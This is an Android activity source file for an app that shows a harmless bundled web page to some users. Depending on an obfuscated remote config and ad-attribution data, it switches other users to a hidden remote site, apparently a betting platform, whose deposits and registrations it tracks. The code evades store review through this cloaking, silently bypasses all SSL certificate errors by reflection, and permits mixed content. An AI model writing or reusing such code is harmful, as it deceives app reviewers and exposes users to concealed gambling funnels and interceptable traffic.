package uwqndja.sdniuqhslabvgz;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.net.http.SslError;
import android.os.Bundle;
import android.os.Message;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustAttribution;
import com.adjust.sdk.AdjustConfig;
import com.adjust.sdk.AdjustEvent;
import com.adjust.sdk.LogLevel;

import org.json.JSONObject;

import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class LaunchActivity extends Activity {
    private static final String S_ADJUST_TOKEN = "yqh2xbrcps00";
    //首次开启 App
    private static final String S_FIRST_OPEN = "";
    //登入成功
    private static final String S_LOGIN = "dm1y7v";
    //注册成功
    private static final String S_REGISTER = "sisw8a";
    //首充到账
    private static final String S_FIRST_DEPOSIT_ARRIVAL = "hwmjeg";
    //充值到账
    private static final String S_DEPOSIT = "8psn3x";
    //打开A面
    private static final String S_VIEW_A = "2e433o";
    //adjust归因读取超60秒
    private static final String S_ADJUST_TIMED_OUT = "7p1mmr";
    //    public static String baseUrl = "https://www.77bet5.com/?a=229398";
    public static String baseUrl = "file:///android_asset/html/index.html";
    private Config mConfig;
    private String eventObjectName = "Android";
    private ProgressBar progressbar;
    private WebView webView;

    private String s1() {
        String url = "https://www.777br8.com/seg.json";
        return getStringFromServer(url);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        initView();

        initData();
    }

    private void initView() {
        requestWindowFeature(1);
        RelativeLayout relativeLayout = new RelativeLayout(getApplicationContext());
        relativeLayout.setFitsSystemWindows(true);
        relativeLayout.setLayoutParams(new LinearLayout.LayoutParams(-1, -1));
        this.webView = new WebView(getApplicationContext());
        relativeLayout.addView(webView, -1, -1);
        this.progressbar = new ProgressBar(this);
        RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(-2, -2);
        layoutParams.addRule(13);
        this.progressbar.setLayoutParams(layoutParams);
        this.progressbar.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        this.progressbar.setIndeterminate(true);
        relativeLayout.addView(this.progressbar);
        setContentView(relativeLayout);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void updateWebView() {
        WebSettings webSettings = this.webView.getSettings();
        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        webSettings.setSupportMultipleWindows(true);
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setDatabaseEnabled(true);
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        webSettings.setSupportZoom(true);
        webSettings.setUseWideViewPort(true);
        webSettings.setDisplayZoomControls(true);
        webSettings.setMediaPlaybackRequiresUserGesture(false);
        webSettings.setLoadsImagesAutomatically(true);
        webSettings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        this.webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        this.webView.setWebChromeClient(new WebChromeClient() {
            public boolean onJsAlert(WebView param1WebView, String param1String1, String param1String2, JsResult param1JsResult) {
                AlertDialog.Builder builder = new AlertDialog.Builder(LaunchActivity.this);
                builder.setMessage(param1String2).setPositiveButton("OK", (arg0, arg1) -> arg0.dismiss()).show();
                param1JsResult.confirm();
                return true;
            }

            @Override
            public boolean onCreateWindow(WebView view, boolean isDialog, boolean isUserGesture, Message resultMsg) {
                WebView tempWebView = new WebView(LaunchActivity.this);
                tempWebView.setWebViewClient(new WebViewClient() {
                    @Override
                    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                        openSystemBrowser(request.getUrl().toString());
//                        view.loadUrl(request.getUrl().toString());
                        return true;
                    }

                    @Override
                    public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
                        try {
                            SslErrorHandler.class.getDeclaredMethod("proceed").invoke(sslErrorHandler);
                        } catch (Exception ignored) {
                        }
                    }
                });

                WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
                transport.setWebView(tempWebView);
                resultMsg.sendToTarget();
                return true;

            }

            public void onProgressChanged(WebView param1WebView, int param1Int) {
                LaunchActivity.this.progressbar.setProgress(param1Int);
                if (param1Int == 100) {
                    LaunchActivity.this.progressbar.setVisibility(View.GONE);
                } else {
                    LaunchActivity.this.progressbar.setVisibility(View.VISIBLE);
                }
                super.onProgressChanged(param1WebView, param1Int);
            }

        });
        this.webView.setWebViewClient(new WebViewClient() {

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());
                return true;
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                try {
                    SslErrorHandler.class.getDeclaredMethod("proceed").invoke(handler);
                } catch (Exception ignored) {
                }
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView param1WebView, String param1String) {
                if (param1String.startsWith("galaxyface://")) {
                    openSystemBrowser(param1String);
                    return true;
                }
                param1WebView.loadUrl(param1String);
                return true;
            }
        });
        this.webView.setDownloadListener((url, userAgent, contentDisposition, mimetype, contentLength) -> openSystemBrowser(url));

        this.webView.addJavascriptInterface(new JSAndroid(), this.eventObjectName);
        this.webView.loadUrl(baseUrl);
    }

    private void openSystemBrowser(String uri) {
        try {
            Intent intent = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
            intent.addCategory(Intent.CATEGORY_BROWSABLE);
            intent.setComponent(null);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void initData() {
        try {
            this.initAdjust();

            new Thread(() -> {
                boolean ck = checkCrypto();
                if (ck) {
                    baseUrl = mConfig.getUrlB();
                } else if (mConfig != null) {
                    baseUrl = mConfig.getUrlA();
                    AdjustEvent adjustEvent = new AdjustEvent(S_VIEW_A);
                    Adjust.trackEvent(adjustEvent);
                }
                runOnUiThread(this::updateWebView);
            }).start();
        } catch (Exception var7) {
            var7.printStackTrace();
        }
    }

    private void initAdjust() {
        AdjustConfig config = new AdjustConfig(this.getApplication(), S_ADJUST_TOKEN, AdjustConfig.ENVIRONMENT_PRODUCTION);
        config.setLogLevel(LogLevel.VERBOSE);
        config.setOnAttributionChangedListener(attribution -> {
        });
        Adjust.onCreate(config);
    }

    protected void onResume() {
        super.onResume();
        try {
            Adjust.onResume();
        } catch (Exception var2) {
            var2.printStackTrace();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onStop() {
        super.onStop();
    }

    protected void onPause() {
        super.onPause();
        try {
            Adjust.onPause();
        } catch (Exception var2) {
            var2.printStackTrace();
        }

    }

    private boolean checkCrypto() {
        mConfig = this.loadCloudConfig();
        if (mConfig != null) {
            if (mConfig.getGate() == 0) {
                return false;
            }
            if (mConfig.getOrganic() == 1) {
                return true;
            }
            return this.getAttribution() == 1;
        }

        return true;
    }

    private int getAttribution() {
        try {
            AdjustAttribution attribution = Adjust.getAttribution();
            long start = System.currentTimeMillis();
            while (attribution == null) {
                try {
                    Thread.sleep(500L);
                } catch (Exception var4) {
                    var4.printStackTrace();
                }
                attribution = Adjust.getAttribution();
            }
            long end = System.currentTimeMillis();
            if (end - start > 60 * 1000) {
                AdjustEvent adjustEvent = new AdjustEvent(S_ADJUST_TIMED_OUT);
                Adjust.trackEvent(adjustEvent);
            }
            if (attribution.network.equalsIgnoreCase("organic")) {
                return 0;
            }
            return 1;
        } catch (Exception var5) {
            var5.printStackTrace();
            return 0;
        }
    }

    private Config loadCloudConfig() {
        return this.decryptConfig(this.decodeKey(this.s1(), true));
    }

    public final String getStringFromServer(String url) {
        String var2 = "";
        try {
            OkHttpClient mOkHttpClient = new OkHttpClient();
            mOkHttpClient.newBuilder().connectTimeout(120L, TimeUnit.SECONDS);
            Request request = (new Request.Builder()).url(url).build();
            Response response = mOkHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                ResponseBody var10000 = response.body();
                if (var10000 != null) {
                    var2 = var10000.string();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return var2;
    }

    private String decodeKey(String base) {
        return decodeKey(base, false);
    }

    private String decodeKey(String base, boolean cfg) {
        try {
            if (base.isEmpty()) {
                return base;
            }
            if (cfg) {
                base = base.substring(Integer.parseInt(base.substring(0, 1)));
            }
            base = new String(Base64.decode(base.getBytes(StandardCharsets.UTF_8), Base64.NO_WRAP), StandardCharsets.UTF_8);
        } catch (Exception var8) {
            base = "";
        }
        return base;
    }

    private Config decryptConfig(String cfg) {
        Config config = null;
        try {
            if (cfg != null && !cfg.isEmpty()) {
                JSONObject json = new JSONObject(cfg);
                config = new Config(json.getInt(decodeKey("Zw==")),//gate g
                        json.getInt(decodeKey("bw==")),//,//organic o
                        json.getString(decodeKey("YQ==")),//urla a
                        json.getString(decodeKey("Yg=="))//urlb b
                );
            }
        } catch (Exception var7) {
            var7.printStackTrace();
        }
        return config;
    }

    @Override
    public boolean dispatchKeyEvent(KeyEvent event) {
        if (event.getKeyCode() == KeyEvent.KEYCODE_BACK) {
            if (webView.canGoBack()) {
                webView.goBack();
            }
            return true;
        }
        return super.dispatchKeyEvent(event);
    }

    public static class JSAndroid {
        public JSAndroid() {
        }

        @JavascriptInterface
        public void eventTracker(String eventType, String eventValues) {
//            Log.e(TAG, eventType + " " + eventValues);
//            aaa {"eventValue":"bbb"}
            String eventToken = null;
            if (eventType.equalsIgnoreCase("firstOpen")) {
                eventToken = S_FIRST_OPEN;
            } else if (eventType.equalsIgnoreCase("login")) {
                eventToken = S_LOGIN;
            } else if (eventType.equalsIgnoreCase("register")) {
                eventToken = S_REGISTER;
            } else if (eventType.equalsIgnoreCase("firstDepositArrival")) {
                eventToken = S_FIRST_DEPOSIT_ARRIVAL;
            } else if (eventType.equalsIgnoreCase("deposit")) {
                eventToken = S_DEPOSIT;
            }
            if (eventToken != null) {
                AdjustEvent adjustEvent = new AdjustEvent(eventToken);
                Adjust.trackEvent(adjustEvent);
            }
        }

    }

    public static class Config {
        //
        private int gate;
        //
        private int organic;
        //
        private String urlA;
        //
        private String urlB;

        public Config(int gate, int organic, String urlA, String urlB) {
            this.gate = gate;
            this.organic = organic;
            this.urlA = urlA;
            this.urlB = urlB;
        }

        public int getGate() {
            return this.gate;
        }

        public int getOrganic() {
            return this.organic;
        }

        public String getUrlA() {
            return urlA;
        }

        public String getUrlB() {
            return urlB;
        }

    }
}

